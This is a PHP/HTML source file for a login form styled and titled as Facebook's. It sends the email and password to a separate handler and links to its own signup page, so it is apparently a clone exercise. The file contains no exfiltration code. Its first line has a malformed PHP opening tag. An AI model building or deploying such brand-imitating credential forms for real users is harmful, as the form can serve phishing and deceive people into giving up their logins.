<div?php
session_start();
?>
<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <title>Facebook Login Page</title>
  <link rel="stylesheet" href="./style.css">
  <link rel="shortcut icon" href="1713419057Facebook_PNG.png" type="image/x-icon">
</head>
<body>
<!-- partial:index.partial.html -->
<div class="container flex">
  <div class="facebook-page flex">
    <div class="text">
      <h1>facebook</h1>
      <p>Connect with friends and the world </p>
      <p> around you on Facebook.</p>
    </div>





    <form action="handle_login.php" method="post">
      <?php
      if(isset($_GET["msg"]) && $_GET["msg"] =='no_user'){
        ?> 

        <div class="alert">
          <strong style= "color :red;" >not available </strong><br>register Enter Email And Password <a href="signup.php">Sign Up</a>
        </div>
      <?php 
      }
      ?>
      <input type="email"  placeholder="Email or phone number" required name="email">
      <input type="password" placeholder="Password" required name="password">
      <div class="link">
        <button type="submit" class="login">Login</button>
        <a href="#" class="forgot">Forgot password?</a>
      </div>
      <hr>
      <div class="button">
        <a href="signup.php">Create new account</a>
      </div>
    </form>
  </div>
</div>
<!-- partial -->
  
</body>
</html>

<?php
$_GET["msg"]=null;
?>